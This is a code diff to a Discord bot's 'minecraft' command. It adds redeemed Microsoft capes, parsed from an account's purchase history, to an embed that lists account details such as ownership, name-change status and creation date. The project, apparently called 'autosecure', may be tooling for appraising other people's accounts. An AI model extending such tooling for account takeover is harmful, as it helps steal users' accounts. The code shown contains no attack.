@@ -1,5 +1,6 @@
 const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
 const generate = require("../../../autosecure/utils/generate");
+const { parsePurchases } = require("../../../autosecure/utils/info/parsePurchases");
 
 module.exports = {
   name: "minecraft",
@@ -77,7 +78,9 @@ module.exports = {
         }
       }
 
+      const { redeemedCapes } = parsePurchases(result[0].purchases);
       const capesString = Array.isArray(capes) && capes.length > 0 ? capes.join(", ") : "None";
+      const redeemedCapesString = redeemedCapes.length > 0 ? redeemedCapes.join(", ") : "None";
 
       let games = [];
       if (Array.isArray(mcitems)) {
@@ -102,7 +105,8 @@ const embed = new EmbedBuilder()
   .addFields(
     { name: "Owns Minecraft", value: `\`\`\`${hasmc === "1" || hasmc === 1 ? "Yes" : "No"}\`\`\``, inline: true },
     { name: "Lunar Cosmetics", value: `\`\`\`${lunarCosmetics}\`\`\``, inline: true },
-    { name: "Capes", value: `\`\`\`${capesString}\`\`\``, inline: true },
+    { name: "Capes (Java)", value: `\`\`\`${capesString}\`\`\``, inline: true },
+    { name: "Redeemed Capes (MS)", value: `\`\`\`${redeemedCapesString}\`\`\``, inline: true },
     { name: "Changed Username", value: `\`\`\`${changedusername === "1" || changedusername === 1 ? "Yes" : "No"}\`\`\``, inline: true },
     { name: "Namechange available", value: `\`\`\`${namechange === "1" || namechange === 1 ? "Yes" : "No"}\`\`\``, inline: true },
     { name: "Creation Date", value: `\`\`\`${creationdate || "Unknown"}\`\`\``, inline: true },
